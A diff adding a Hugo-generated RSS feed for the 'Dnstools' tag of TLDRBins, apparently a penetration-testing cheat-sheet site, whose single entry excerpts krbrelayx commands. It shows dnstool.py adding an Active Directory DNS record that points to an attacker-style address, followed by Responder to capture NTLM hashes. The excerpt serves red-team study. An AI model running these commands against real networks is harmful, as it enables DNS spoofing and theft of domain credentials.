@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Dnstools on TLDRBins</title>
+    <link>https://tldrbins.github.io/@dnstools/</link>
+    <description>Recent content in Dnstools on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@dnstools/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Krbrelayx</title>
+      <link>https://tldrbins.github.io/krbrelayx/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/krbrelayx/</guid>
+      <description> Tools krbrelayx&#xA;Abuse #1: Add Active Directory Integrated DNS records via LDAP python3 dnstool.py -u &amp;lt;DOMAIN&amp;gt;\\&amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --action add --record test --data 10.10.14.10 --type A 10.10.11.10 # Capture NTLM hash sudo responder -I tun0 </description>
+    </item>
+  </channel>
+</rss>
